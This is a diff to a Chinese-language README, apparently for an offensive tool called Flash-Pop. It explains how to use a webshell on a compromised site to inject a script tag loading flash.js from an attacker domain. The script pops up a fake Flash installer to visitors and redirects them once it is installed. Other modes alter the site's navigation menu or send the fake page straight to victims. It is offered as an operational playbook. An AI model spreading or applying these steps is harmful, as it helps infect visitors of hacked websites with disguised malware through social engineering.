@@ -44,7 +44,7 @@ Flash-Pop升级版
 
 ### 应用
 
-  1. 已有webshell，可以修改网站源代码
+  1. 已有webshell，可以修改网站源代码,检测是否已安装
 
      - 修改网站源码，添加`<script  src=https://flash-pop2-domain.com/js/flash.js></script>`
 
@@ -56,4 +56,25 @@ Flash-Pop升级版
 
      - 将https://flash-pop2-domain.com/index.html直接发送给对方
 
-   
+4. 已有webshell，可以修改网站源代码，不检测是否已安装
+   - 修改网站源码，添加`<script  src=https://flash-pop2-domain.com/js/flash.js></script>`
+
+## 应用场景（a_type）：
+
+1. 【0】已有webshell，可以修改源码,检测是否已安装flash，
+
+2. 1. 在目标网站的页面源码中直接插入js：已安装flash的情况下，不做任何操作；未安装flash，弹出flash页面，定时检测，安装完成后，页面刷新 [0]
+
+3. 【1】没有webshell，可以修改目标网站的导航菜单：
+
+4. 1. 添加自己的flash页面，供受害者点击；
+   2. 如果设置了特定页面，则当安装完成后，则跳转到指定页面；
+   3. 若未设置，则跳转到document.referrer(如果其不包含js中设置的域名)[1]
+
+5. 【2】直接发送给对方
+
+6. 1. 对方直接在浏览器中输入flash地址：如果安装完成后，则直接跳转到指定页面；[2]
+
+7. 【3】已有webshell，可以修改源码，不检测是否已安装flash
+
+8. 1. 在目标网站的页面源码中直接插入js：弹出flash页面,不检测是否已安装flash. [3]
